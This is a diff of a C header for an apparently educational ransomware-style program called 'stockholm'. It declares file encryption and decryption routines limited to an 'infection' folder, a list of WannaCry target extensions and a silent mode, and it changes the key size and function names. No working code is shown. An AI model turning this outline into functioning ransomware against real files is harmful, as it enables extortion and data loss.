@@ -14,8 +14,11 @@
 
 #define HOME getenv("HOME")
 #define INFECTION_DIR "/infection"
-#define KEY_SIZE 16
+#define KEY_SIZE 32
 #define IV_SIZE 16
+
+extern const char *wannacry_extensions[];
+extern const int num_wannacry_extensions;
 
 typedef struct {
     unsigned char *key;         // Encryption key
@@ -27,17 +30,17 @@ typedef struct {
 } crypto_params;
 
 // Encrypt
-int     encrypt(crypto_params *params);
-void    encrypt_files();
+int     stockholm_encrypt(crypto_params *params);
+void    encrypt_files(int silent_mode);
 
 // Decrypt
-int     decrypt(crypto_params *params);
-void    decrypt_files(const char *key_hex);
+int     stockholm_decrypt(crypto_params *params);
+void    decrypt_files(const char *key_hex, int silent_mode);
 
 // Utils
 void    setup_infection_directory();
 void    rename_file(const char *filename);
 void    handle_errors();
-void    hex_to_bin(const char *hex, unsigned char *bin, size_t len)
+void    hex_to_bin(const char *hex, unsigned char *bin, size_t len);
 
 #endif // ENCRYPTION_H
